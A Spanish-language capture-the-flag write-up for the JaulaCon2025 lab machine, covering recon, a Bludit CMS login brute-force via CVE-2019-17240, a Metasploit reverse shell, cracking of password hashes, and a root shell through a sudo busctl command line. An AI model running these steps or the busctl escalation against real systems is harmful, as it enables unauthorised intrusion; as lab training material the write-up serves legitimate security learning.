# 🛡️ Write-up – JaulaCon2025 (TheHackerLabs)

## 🧠 Objetivo

Comprometer el sistema, obtener acceso como `root` y capturar las flags `user` y `root`.

---

## 🔎 1. Reconocimiento inicial

### 🧪 Escaneo de puertos con `nmap`

```bash
nmap -sC -sV -Pn 192.168.1.73
```

**Resultado:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    Apache httpd 2.4.62 (Debian)
```

El puerto 80 muestra contenido web gestionado por **Bludit CMS**:

```
http-generator: Bludit
http-title: Bienvenido a Bludit | BLUDIT
```


## 🌐 2. Resolución del dominio

El HTML contenía rutas absolutas apuntando a `http://jaulacon2025.thl`, lo que impedía que se mostraran los estilos correctamente al acceder por IP.

### 🔧 Solución:

Se añadió una entrada en `/etc/hosts`:

```
192.168.1.73  jaulacon2025.thl
```

Así se pudo acceder correctamente al contenido web renderizado.


## 🔓 3. Descubrimiento de login

A través de `/admin`, se accede al panel de login de Bludit CMS.

Tras enumerar rutas con `dirb`, se confirmó la ruta de administración:

```
http://jaulacon2025.thl/admin
```


## 🢨 4. Fuerza bruta de login (CVE-2019-17240)

Bludit 3.9.2 es vulnerable a bypass de limitación de intentos usando la cabecera `X-Forwarded-For`.

### 🔧 Se usó un script de Ruby encontrado en Exploit-DB:

- Script en Ruby más robusto que resolvió correctamente el login

### ✅ Credenciales obtenidas:

```
Usuario: Jaulacon2025
Contraseña: cassandra
```


## 📛 5. Explotación con Metasploit

Se usó el módulo:

```bash
use exploit/linux/http/bludit_upload_images_exec
```

Con los parámetros:

- USERNAME: `Jaulacon2025`
- PASSWORD: `cassandra`
- LHOST: `192.168.1.109`

### ✅ Resultado:

Obtención de **una reverse shell como **``


## 🔎 6. Post-explotación: enumeración y cracking

Se buscó información sensible en `/var/www/html/bl-content/databases/users.php`, donde se encontraron los siguientes hashes y salt:

| Usuario      | Hash (SHA1)                              | Salt          |
| ------------ | ---------------------------------------- | ------------- |
| admin        | 67def80155faa894bfb132889e3825a2718db22f | 67e2f74795e73 |
| Jaulacon2025 | a0fcd99fe4a21f30abd2053b1cf796da628e4e7e | bo22u72!      |
| JaulaCon2025 | 551211bcd6ef18e32742a73fcb85430b         | jejej         |

Se intentó crackear con `john` usando el formato `dynamic_26` y `rockyou.txt`, pero no funcionó debido a codificación incorrecta del archivo (fin de línea `^M`).

### 🔑 Se recurrió a [CrackStation](https://crackstation.net):

```text
Hash: 551211bcd6ef18e32742a73fcb85430b → Password: Brutales
```


## 🔐 7. Acceso a usuario con contraseña crackeada

Se accedió con `su JaulaCon2025` y la contraseña `Brutales`.

Luego:

```bash
sudo -l
```

Resultado:

```
User JaulaCon2025 may run the following command:
(root) NOPASSWD: /usr/bin/busctl
```


## ⚙️ 8. Explotación de `busctl` para obtener shell root

Se ejecutó:

```bash
sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 \
org.freedesktop.systemd1.Manager LogLevel s debug \
--address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

Y se obtuvo una **shell interactiva como root**.


## 🏑️ 9. Flags obtenidas

```bash
cat /home/JaulaCon2025/user.txt
cat /root/root.txt
```

---

## ✅ Resumen final

| Acción             | Herramienta/Técnica                        | Resultado              |
| ------------------ | ------------------------------------------ | ---------------------- |
| Descubrimiento CMS | `nmap`, análisis HTML                      | Bludit 3.9.2           |
| Fuerza bruta login | Script Python + Ruby exploit               | Usuario `Jaulacon2025` |
| Reverse shell      | `Metasploit` (`bludit_upload_images_exec`) | Acceso como `www-data` |
| Post-explotación   | Crackeo de hash desde `users.php`          | Contraseña `Brutales`  |
| Escalada a root    | `sudo /usr/bin/busctl`                     | Shell root             |
| Flags capturadas   | `cat user.txt && cat root.txt`             | Éxito total            |

